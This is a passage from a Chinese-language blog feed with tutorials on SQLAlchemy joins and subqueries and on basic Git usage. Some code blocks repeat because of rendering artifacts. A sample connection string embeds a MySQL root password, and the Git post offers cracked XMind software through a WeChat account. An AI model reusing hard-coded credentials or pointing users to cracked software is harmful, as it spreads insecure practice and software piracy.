punctuation">.</span>query<span class="token punctuation">(</span>User1<span class="token punctuation">)</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>Address1<span class="token punctuation">,</span> User1<span class="token punctuation">.</span>id <span class="token operator">==</span> Address1<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q5<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""SELECT user_1.id AS user_1_id, user_1.name AS user_1_name, user_1.fullname AS user_1_fullname, user_1.nickname AS user_1_nickname FROM user_1 INNER JOIN addresses_1 ON user_1.id = addresses_1.id"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用别名查询: 在多个表中查询时,如果同一个表需要多次应用,可以给表起个别名.比如</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> aliaseda1 <span class="token operator">=</span> aliased<span class="token punctuation">(</span>Address1<span class="token punctuation">)</span>a2 <span class="token operator">=</span> aliased<span class="token punctuation">(</span>Address1<span class="token punctuation">)</span>test1 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User1<span class="token punctuation">.</span>name<span class="token punctuation">,</span> a1<span class="token punctuation">.</span>email_address<span class="token punctuation">,</span> a2<span class="token punctuation">.</span>email_address<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>test1<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""SELECT user_1.name AS user_1_name, addresses_1_1.email_address AS addresses_1_1_email_address, addresses_1_2.email_address AS addresses_1_2_email_address FROM user_1, addresses_1 AS addresses_1_1, addresses_1 AS addresses_1_2"""</span>test3<span class="token operator">=</span>session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User1<span class="token punctuation">.</span>name<span class="token punctuation">,</span> a1<span class="token punctuation">.</span>email_address<span class="token punctuation">,</span> a2<span class="token punctuation">.</span>email_address<span class="token punctuation">)</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>a1<span class="token punctuation">,</span> User1<span class="token punctuation">.</span>id <span class="token operator">==</span> a1<span class="token punctuation">.</span>user_id<span class="token punctuation">)</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>a2<span class="token punctuation">,</span> User1<span class="token punctuation">.</span>id <span class="token operator">==</span> a2<span class="token punctuation">.</span>user_id<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>test3<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""SELECT user_1.name AS user_1_name, addresses_1_1.email_address AS addresses_1_1_email_address, addresses_1_2.email_address AS addresses_1_2_email_address FROM user_1 INNER JOIN addresses_1 AS addresses_1_1 ON user_1.id = addresses_1_1.user_id INNER JOIN addresses_1 AS addresses_1_2 ON user_1.id = addresses_1_2.user_id"""</span>test4 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User1<span class="token punctuation">.</span>name<span class="token punctuation">,</span> a1<span class="token punctuation">.</span>email_address<span class="token punctuation">,</span> a2<span class="token punctuation">.</span>email_address<span class="token punctuation">)</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>a1<span class="token punctuation">,</span> User1<span class="token punctuation">.</span>id <span class="token operator">==</span> a1<span class="token punctuation">.</span>user_id<span class="token punctuation">)</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>a2<span class="token punctuation">,</span> User1<span class="token punctuation">.</span>id <span class="token operator">==</span> a2<span class="token punctuation">.</span>user_id<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>a1<span class="token punctuation">.</span>email_address<span class="token operator">==</span><span class="token string">'xxx@xx1.com'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>a2<span class="token punctuation">.</span>email_address<span class="token operator">==</span><span class="token string">'xxx@xx2.com'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>test4<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""SELECT user_1.name AS user_1_name, addresses_1_1.email_address AS addresses_1_1_email_address, addresses_1_2.email_address AS addresses_1_2_email_address FROM user_1 INNER JOIN addresses_1 AS addresses_1_1 ON user_1.id = addresses_1_1.user_id INNER JOIN addresses_1 AS addresses_1_2 ON user_1.id = addresses_1_2.user_id WHERE addresses_1_1.email_address = %(email_address_1)s AND addresses_1_2.email_address = %(email_address_2)s"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>更多的查询阅读官网</p><pre class="line-numbers language-bash"><code class="language-bash">https://docs.sqlalchemy.org/en/13/orm/query.html<span class="token comment" spellcheck="true">#sqlalchemy.orm.query.Query.join</span>https://docs.sqlalchemy.org/en/13/orm/tutorial.html<span class="token comment" spellcheck="true">#querying-with-joins</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h3 id="17-outerjoin"><a href="#17-outerjoin" class="headerlink" title="17.outerjoin()"></a>17.<code>outerjoin()</code></h3><blockquote><p>左连接,用法和<code>join()</code> 一样.</p></blockquote><h3 id="18-子查询subquery"><a href="#18-子查询subquery" class="headerlink" title="18.子查询subquery"></a>18.子查询<code>subquery</code></h3><blockquote><p><code>Query</code>对象不仅仅可以用于查询,还可以用于生成子查询.<br>有如下<code>ORM</code>对应:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> Column<span class="token punctuation">,</span>String<span class="token punctuation">,</span>Integer<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> create_engine<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> ForeignKey<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>ext<span class="token punctuation">.</span>declarative <span class="token keyword">import</span> declarative_base<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> sessionmaker<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> relationship<span class="token comment" spellcheck="true"># 1.创建连接</span>engine <span class="token operator">=</span> create_engine<span class="token punctuation">(</span><span class="token string">'mysql+pymysql://root:2008.Cn123@192.168.0.101/test'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2.创建 session池,并实例化</span>Session <span class="token operator">=</span> sessionmaker<span class="token punctuation">(</span>bind<span class="token operator">=</span>engine<span class="token punctuation">)</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3.创建基类</span>Base <span class="token operator">=</span> declarative_base<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建Model</span><span class="token keyword">class</span> <span class="token class-name">User1</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>   __tablename__ <span class="token operator">=</span> <span class="token string">'user_1'</span>   id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>   name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   fullname <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   nickname <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 定义双向对应,连接的是 Model</span>   address <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Address1'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Address1</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>   __tablename__ <span class="token operator">=</span> <span class="token string">'addresses_1'</span>   id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>   email_address <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 定义外键</span>   user_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'user_1.id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 定义双向对应</span>   user <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'User1'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'address'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>假设要通过数据库查询每个用户<code>user</code>拥有的<code>email_address</code>的个数.<br>可以使用子查询来解决这个问题:<br>1.先查看一下表</p><pre class="line-numbers language-mysql"><code class="language-mysql">mysql root@192.168.101:test> select * from user_1;           +----+-------+-----------+----------+| id | name  | fullname  | nickname |+----+-------+-----------+----------+| 1  | Jack  | Jack Ning | Ningning || 2  | Bob   | Bob Ning  | Bob NN   || 3  | Harry | Harry K   | K K      |+----+-------+-----------+----------+3 rows in setTime: 0.015smysql root@192.168.101:test> select * from addresses_1;\+----+---------------+---------+| id | email_address | user_id |+----+---------------+---------+| 1  | xxx@xx1.com   | 1       || 2  | xxx@xx2.com   | 1       || 3  | xxx@xx3.com   | 1       || 4  | xxx@xx4.com   | 2       || 5  | xxx@xx5.com   | 2       || 6  | xxx@xx6.com   | 3       || 7  | xxx@xx7.com   | 3       |+----+---------------+---------+7 rows in setTime: 0.014s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.查看临时表</p><pre class="line-numbers language-mysql">select count(a.id),a.user_id from addresses_1 as a group by a.user_id;</code></pre><p>3.利用临时表查询</p><pre><code class="mysql"><code class="language-mysql">select count(a.id),a.user_id from addresses_1 as a group by a.user_id;</code></pre><p>3.利用临时表查询</p><pre><code class="mysql">-- 生成临时表用于查询> select u.fullname,temp_count_address.count from user_1 as u inner join (select count(a.id) as count,  -- 给聚合函数的结果一个别名a.user_id from addresses_1 as a group by a.user_id) as temp_count_address -- 给临时表一个别名 where u.id=temp_count_address.user_id; +-----------+-------+| fullname  | count |+-----------+-------+| Jack Ning | 3     || Bob Ning  | 2     || Harry K   | 2     |+-----------+-------+3 rows in setTime: 0.015s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>ORM</code>中,从内到外构造这样的语句.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> func<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> aliaseda <span class="token operator">=</span> aliased<span class="token punctuation">(</span>Address1<span class="token punctuation">)</span>stmt <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>a<span class="token punctuation">.</span>user_id<span class="token punctuation">,</span> func<span class="token punctuation">.</span>count<span class="token punctuation">(</span>a<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">.</span>label<span class="token punctuation">(</span><span class="token string">'count'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>group_by<span class="token punctuation">(</span>a<span class="token punctuation">.</span>user_id<span class="token punctuation">)</span><span class="token punctuation">.</span>subquery<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>它是一个<code>sqlalchemy.aql.selecttable</code>对象,<code>help stmt</code>可以看到这个对象拥有重要属性<code>columns</code></p><pre class="line-numbers language-mardown"><code class="language-mardown">columns(...)   A named-based collection of :class:`.ColumnElement` objects   maintained by this :class:`.FromClause`.   The :attr:`.columns`, or :attr:`.c` collection, is the gateway   to the construction of SQL expressions using table-bound or   other selectable-bound columns::       select([mytable]).where(mytable.c.somecolumn == 5)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>columns</code>这个属性可以简写成<code>c</code>,通过这个属性可以拿到表中对应列的值.<br><code>stmt</code>这个对象的行为类似与<code>Table</code>对象</p><pre class="line-numbers language-python">print(stmt.columns.count)</code></pre><pre><code>anon_1.count</code></pre><pre><code class="python">q1 = session.query(stmt.columns.count)</code></pre><pre><code class="python"><code class="language-python">print(stmt.columns.count)</code></pre><pre><code>anon_1.count</code></pre><pre><code class="python">q1 = session.query(stmt.columns.count)</code></pre><pre><code class="python">print(q1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>SELECT anon_1.count AS anon_1_count FROM (SELECT addresses_1_1.user_id AS user_id, count(addresses_1_1.id) AS count FROM addresses_1 AS addresses_1_1 GROUP BY addresses_1_1.user_id) AS anon_1</code></pre><p>可以看到<code>stmt</code>其实是子查询的集合体,它可以通过<code>query</code>语句再次查询结果.</p><pre class="line-numbers language-python"><code class="language-python">u <span class="token operator">=</span> aliased<span class="token punctuation">(</span>User1<span class="token punctuation">)</span>q2 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>u<span class="token punctuation">.</span>fullname<span class="token punctuation">,</span> stmt<span class="token punctuation">.</span>columns<span class="token punctuation">.</span>count<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>u<span class="token punctuation">.</span>id<span class="token operator">==</span>stmt<span class="token punctuation">.</span>columns<span class="token punctuation">.</span>user_id<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre><code>SELECT user_1_1.fullname AS user_1_1_fullname, anon_1.count AS anon_1_count FROM user_1 AS user_1_1, (SELECT addresses_1_1.user_id AS user_id, count(addresses_1_1.id) AS count FROM addresses_1 AS addresses_1_1 GROUP BY addresses_1_1.user_id) AS anon_1 WHERE user_1_1.id = anon_1.user_id</code></pre><p>对比执行的<code>sql</code>语句</p><pre class="line-numbers language-mysql"><code class="language-mysql">select u.fullname,temp_count_address.count from user_1 as u inner join (select count(a.id) as count,  -- 给聚合函数的结果一个别名a.user_id from addresses_1 as a group by a.user_id) as temp_count_address -- 给临时表一个别名 where u.id=temp_count_address.user_id;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>q2</code>执行的功能上完全和<code>SQL</code>语句相同.<br>执行<code>q2.all()</code>通过查看<code>MySQL</code>的查询日志对比</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">cat</span> /mysql_data/localhost.log <span class="token punctuation">..</span>.SELECT user_1_1.fullname AS user_1_1_fullname, anon_1.count AS anon_1_count FROM user_1 AS user_1_1, <span class="token punctuation">(</span>SELECT addresses_1_1.user_id AS user_id, count<span class="token punctuation">(</span>addresses_1_1.id<span class="token punctuation">)</span> AS count FROM addresses_1 AS addresses_1_1 GROUP BY addresses_1_1.user_id<span class="token punctuation">)</span> AS anon_1 WHERE user_1_1.id <span class="token operator">=</span> anon_1.user_id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python">q2<span class="token punctuation">.</span>all<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>[(&#39;Jack Ning&#39;, 3), (&#39;Bob Ning&#39;, 2), (&#39;Harry K&#39;, 2)]</code></pre></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> Flask </tag>
            
            <tag> Python </tag>
            
            <tag> MySQL </tag>
            
            <tag> SQLAlchemy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git学习</title>
      <link href="/posts/3151.html"/>
      <url>/posts/3151.html</url>
      
        <content type="html"><![CDATA[<h2 id="Git"><a href="#Git" class="headerlink" title="Git"></a><code>Git</code></h2><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/git_learn.png" alt="git_learn"></p><h3 id="1-历史"><a href="#1-历史" class="headerlink" title="1.历史"></a>1.历史</h3><blockquote><p>同生活中的许多伟大事物一样,<code>Git</code> 诞生于一个极富纷争大举创新的年代.</p><p>Linux 内核开源项目有着为数众多的参与者. 绝大多数的 Linux 内核维护工作都花在了提交补丁和保存归档的繁琐事务上(1991-2002年间), 到 2002 年,整个项目组开始启用一个专有的分布式版本控制系统<code>BitKeeper</code>来管理和维护代码.</p><p>到了 2005 年，开发 <code>BitKeeper</code> 的商业公司同 Linux 内核开源社区的合作关系结束,他们收回了 Linux 内核社区免费使用<code>BitKeeper</code> 的权力.这就迫使 Linux 开源社区(特别是 Linux 的缔造者 Linus Torvalds)基于使用 <code>BitKeeper</code> 时的经验教训,开发出自己的版本系统.他们对新的系统制订了若干目标:</p><ul><li>速度</li><li>简单的设计</li><li>对非线性开发模式的强力支持（允许成千上万个并行开发的分支）</li><li>完全分布式</li><li>有能力高效管理类似 Linux 内核一样的超大规模项目（速度和数据量）</li></ul><p>自诞生于 2005 年以来,<code>Git</code>日臻成熟完善,在高度易用的同时,仍然保留着初期设定的目标.它的速度飞快,极其适合管理大项目,有着令人难以置信的非线性分支管理系统.</p></blockquote><h3 id="2-基本概念"><a href="#2-基本概念" class="headerlink" title="2.基本概念"></a>2.基本概念</h3><h4 id="1-Git是什么"><a href="#1-Git是什么" class="headerlink" title="1.Git是什么"></a>1.<code>Git</code>是什么</h4><blockquote><p>对比其他的版本工具,会发现<code>Git</code>根本上的不同.</p><ul><li><code>VCS\Subversion\Perforce</code>等,会将它们存储的信息看作是一组基本文件和每个文件随时间逐步累积的差异(<code>delte-based</code>)</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10214.png" alt="10214"></p><ul><li><code>Git</code>最大的不同是,他会把数据看作是小型文件系统的一系列快照,每当提交更新或保存项目状态时,它基本上就会对当时的全部文件创建一个快照并保存这个快照的索引.为了效率.如果文件没有修改,Git 不再重新存储该文件,而是只保留一个链接指向之前存储的文件.</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10215.png" alt="10215"></p><p>综合以上,<code>Git</code> 更像是一个小型的文件系统.</p></blockquote><h4 id="2-Git-中文件状态"><a href="#2-Git-中文件状态" class="headerlink" title="2.Git 中文件状态"></a>2.<code>Git</code> 中文件状态</h4><blockquote><p><code>Git</code>中,文件可能会处于以下其中一种状态.</p><ul><li><code>Committed</code>(已提交):数据已经安全地保存在本地数据库中</li><li><code>Modified</code>(已修改):修改了文件,但还没保存到数据库中</li><li><code>Staged</code>(已暂存):对一个已修改文件的当前版本做了标记,使之包含在下次提交的快照中</li></ul></blockquote><h4 id="3-Git文件逻辑流程"><a href="#3-Git文件逻辑流程" class="headerlink" title="3.Git文件逻辑流程"></a>3.<code>Git</code>文件逻辑流程</h4><blockquote><p>一个文件,只能经过以下的流程状态</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10212.png" alt="10212"></p></blockquote><h4 id="4-Git文件逻辑状态"><a href="#4-Git文件逻辑状态" class="headerlink" title="4.Git文件逻辑状态"></a>4.<code>Git</code>文件逻辑状态</h4><blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10213.png" alt="10213"></p><p><strong><code>Untrucked</code></strong> :未跟踪, 此文件在文件夹中, 但并没有加入到git库, 不参与版本控制. 通过<code>git add</code> 状态变为<code>Staged</code>.</p><p><strong><code>Unmodify</code></strong>: 文件已经入库, 未修改, 即版本库中的文件快照内容与文件夹中完全一致. 这种类型的文件有两种去处, 如果它被修改, 而变为<code>Modified</code>. 如果使用<code>git rm</code>移出版本库, 则成为<code>Untracked</code>文件.</p><p><strong><code>Modified</code></strong>: 文件已修改, 仅仅是修改, 并没有进行其他的操作. 这个文件也有两个去处, 通过<code>git add</code>可进入暂存<code>staged</code>状态, 使用<code>git checkout</code> 则丢弃修改过, 返回到<code>unmodify</code>状态, 这个<code>git checkout</code>即从库中取出文件, 覆盖当前修改.</p><p>**<code>Staged</code>**：暂存状态,执行<code>git commit</code>则将修改同步到库中,这时库中的文件和本地文件又变为一致, 文件为<code>Unmodify</code>状态. 执行<code>git reset HEAD filename</code>取消暂存, 文件状态为<code>Modified</code></p></blockquote><h3 id="3-安装Git"><a href="#3-安装Git" class="headerlink" title="3.安装Git"></a>3.安装<code>Git</code></h3><blockquote><ul><li><code>ubuntu</code></li></ul><pre class="line-numbers language-bash">$ sudo apt install git</code></pre><ul><li><code>windows</code></li></ul><p><code>https://git-scm.com/</code>下载对应的版本安装</p></blockquote><h3 id="4-Git命令"><a href="#4-Git命令" class="headerlink" title="4.Git命令"></a>4.<code>Git</code>命令</h3><blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/Git_com.png" alt="Git_com"></p><p>注意:此图片使用<code>xmind</code>生成.如果图片不清晰,请下载原始文件:<code>https://gitee.com/ningwenyan/font</code></p><p>如果需要<code>xmind</code>破解版软件,可直接在公众号回复<code>xmind</code>.</p></blockquote><h4 id="1-获取帮助git-help"><a href="#1-获取帮助git-help" class="headerlink" title="1.获取帮助git help"></a>1.获取帮助<code>git help</code></h4><blockquote><pre><code class="bash"><code class="language-bash">$ sudo apt install git</code></pre><ul><li><code>windows</code></li></ul><p><code>https://git-scm.com/</code>下载对应的版本安装</p></blockquote><h3 id="4-Git命令"><a href="#4-Git命令" class="headerlink" title="4.Git命令"></a>4.<code>Git</code>命令</h3><blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/Git_com.png" alt="Git_com"></p><p>注意:此图片使用<code>xmind</code>生成.如果图片不清晰,请下载原始文件:<code>https://gitee.com/ningwenyan/font</code></p><p>如果需要<code>xmind</code>破解版软件,可直接在公众号回复<code>xmind</code>.</p></blockquote><h4 id="1-获取帮助git-help"><a href="#1-获取帮助git-help" class="headerlink" title="1.获取帮助git help"></a>1.获取帮助<code>git help</code></h4><blockquote><pre><code class="bash">$ git help用法：git [--version] [--help] [-C <path>] [-c <键名>=<值>]           [--exec-path[=<路径>]] [--html-path] [--man-path] [--info-path]           [-p | --paginate | --no-pager] [--no-replace-objects] [--bare]           [--git-dir=<路径>] [--work-tree=<路径>] [--namespace=<名称>]           <命令> [<参数>]这些是各种场合常见的 Git 命令：开始一个工作区（参见：git help tutorial）   clone      克隆一个仓库到一个新目录   init       创建一个空的 Git 仓库或重新初始化一个已存在的仓库在当前变更上工作（参见：git help everyday）   add        添加文件内容至索引   mv         移动或重命名一个文件、目录或符号链接   reset      重置当前 HEAD 到指定状态   rm         从工作区和索引中删除文件检查历史和状态（参见：git help revisions）   bisect     通过二分查找定位引入 bug 的提交   grep       输出和模式匹配的行   log        显示提交日志   show       显示各种类型的对象   status     显示工作区状态扩展、标记和调校您的历史记录   branch     列出、创建或删除分支   checkout   切换分支或恢复工作区文件   commit     记录变更到仓库   diff       显示提交之间、提交和工作区之间等的差异   merge      合并两个或更多开发历史   rebase     在另一个分支上重新应用提交   tag        创建、列出、删除或校验一个 GPG 签名的标签对象协同（参见：git help workflows）   fetch      从另外一个仓库下载对象和引用   pull       获取并整合另外的仓库或一个本地分支   push       更新远程引用和相关的对象命令 'git help -a' 和 'git help -g' 显示可用的子命令和一些概念帮助。查看 'git help <命令>' 或 'git help <概念>' 以获取给定子命令或概念的帮助。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="2-配置命令git-config"><a href="#2-配置命令git-config" class="headerlink" title="2.配置命令git config"></a>2.配置命令<code>git config</code></h4><blockquote><p>在初始化仓库之前,最需要做的是配置用户名和电子邮件,这两条配置非常重要,每次<code>Git</code>提交时都会引用这两条信息,用于说明是谁提交了更新.</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">git</span> config -helpusage: <span class="token function">git</span> config <span class="token punctuation">[</span><span class="token operator">&lt;</span>options<span class="token operator">></span><span class="token punctuation">]</span>Config <span class="token function">file</span> location --global              use global config <span class="token function">file</span>  <span class="token comment" spellcheck="true">#全局变量</span> --system              use system config <span class="token function">file</span>  <span class="token comment" spellcheck="true"># 登陆系统的账户</span> --local               use repository config <span class="token function">file</span>   <span class="token comment" spellcheck="true"># 局部本地设置,针对当前的项目中的独立设置,优先级高于global</span> --worktree            use per-worktree config <span class="token function">file</span> -f, --file <span class="token operator">&lt;</span>file<span class="token operator">></span>     use given config <span class="token function">file</span> --blob <span class="token operator">&lt;</span>blob-id<span class="token operator">></span>      <span class="token function">read</span> config from given blob object<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中有3个选项可供选择.</p><ul><li><code>--global</code>:全局变量,</li><li><code>--system</code>:只针对当前登录到系统的用户</li><li><code>--local</code>:局部本地设置,针对当前的项目中的独立设置,优先级高于<code>global</code></li></ul><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> config --global user.name <span class="token string">"用户名"</span> <span class="token comment" spellcheck="true"># 设置用户名</span><span class="token function">git</span> config --global user.email <span class="token string">"用户邮箱"</span>   <span class="token comment" spellcheck="true">#设置邮箱</span><span class="token function">git</span> config --global user.name   <span class="token comment" spellcheck="true"># 查看用户名是否配置成功</span><span class="token function">git</span> config --global user.email   <span class="token comment" spellcheck="true"># 查看邮箱是否配置</span><span class="token comment" spellcheck="true"># 其他查看配置相关</span><span class="token function">git</span> config --global --list  <span class="token comment" spellcheck="true"># 查看全局设置相关参数列表</span><span class="token function">git</span> config --local --list <span class="token comment" spellcheck="true"># 查看本地设置相关参数列表</span><span class="token function">git</span> config --system --list <span class="token comment" spellcheck="true"># 查看系统配置参数列表</span><span class="token function">git</span> config --list  <span class="token comment" spellcheck="true"># 查看所有Git的配置(全局+本地+系统)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="3-初始化仓库git-init"><a href="#3-初始化仓库git-init" class="headerlink" title="3.初始化仓库git init"></a>3.初始化仓库<code>git init</code></h4><blockquote><p>进入要初始化的文件目录,然后创建<code>Git</code>仓库</p><pre class="line-numbers language-bash">$ git init</code></pre><p>例如:</p><pre><code class="bash"><code class="language-bash">$ git init</code></pre><p>例如:</p><pre><code class="bash">❯ cd temp❯ mkdir git_learn❯ cd git_learn❯ git init已初始化空的 Git 仓库于 /home/kning/temp/git_learn/.git/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="4-添加文件到暂存区git-add"><a href="#4-添加文件到暂存区git-add" class="headerlink" title="4.添加文件到暂存区git add"></a>4.添加文件到暂存区<code>git add</code></h4><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">git</span> add -helpusage: <span class="token function">git</span> add <span class="token punctuation">[</span><span class="token operator">&lt;</span>options<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token punctuation">]</span> <span class="token operator">&lt;</span>pathspec<span class="token operator">></span><span class="token punctuation">..</span>.-n, --dry-run         dry run-v, --verbose         be verbose-i, --interactive     interactive picking-p, --patch<span class="token punctuation">[</span><span class="token operator">=</span><span class="token operator">&lt;</span>patch-mode<span class="token operator">></span><span class="token punctuation">]</span>                    <span class="token 